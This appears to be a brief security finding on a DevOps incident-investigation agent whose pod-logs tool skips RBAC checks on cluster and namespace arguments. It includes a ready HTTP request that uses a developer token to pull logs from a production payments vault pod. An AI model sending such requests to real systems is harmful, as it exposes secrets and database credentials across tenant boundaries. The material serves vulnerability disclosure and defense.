diagnosis: The DevOps incident investigation agent tool invokes fetchPodLogsTool with arbitrary clusterId and namespace values parsed from tool arguments. It fails to verify that the authenticated engineer has RBAC permissions on the target cluster or tenant namespace. An attacker with standard engineering credentials can supply target cluster and namespace identifiers for isolated production workloads, extracting confidential container logs, environment secrets, and database connection strings.
exploit_request:
POST /api/agent/tools/pod-logs HTTP/1.1
Host: devops-copilot.internal.net:8117
Authorization: Bearer engineer_token_dev
Content-Type: application/json

{"toolArgs": {"clusterId": "prod-cluster-us-east-1", "namespace": "payments-vault", "podName": "vault-server-0"}}
